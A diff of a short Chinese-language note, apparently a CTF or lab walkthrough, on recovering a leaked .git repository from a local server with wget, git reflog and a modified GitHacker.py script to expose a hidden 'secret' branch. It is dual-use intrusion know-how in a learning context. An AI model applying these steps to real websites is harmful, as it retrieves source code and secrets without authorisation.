@@ -36,12 +36,14 @@ git brance -v # 只可查看master分支
 git reflog 查看checkout记录， 可看到其他分支secret
 
 wget http://127.0.0.1:8000/.git/refs/heads/secret # 获取其他分支文件
-# 修改GitHacker.py, 直接调用fixmissing函数进行恢复
-if __name__ == "__main__":
-  # main()
-  baseurl = complete_url('http://127.0.0.1:8000/.git/')
-  temppath = replace_bad_chars(get_prefix(baseurl))
-  fixmissing(baseurl, temppath)
+```
+修改GitHacker.py, 直接调用fixmissing函数进行恢复
+  if __name__ == "__main__":
+     main()
+    baseurl = complete_url('http://127.0.0.1:8000/.git/')
+    temppath = replace_bad_chars(get_prefix(baseurl))
+    fixmissing(baseurl, temppath)
+```
 调用python GitHacker.py进行恢复, 
 在文件夹内，调用git log -all, git branch -v 可查看到分支secret
 git diff HEAD commit-id, 查看分支差异
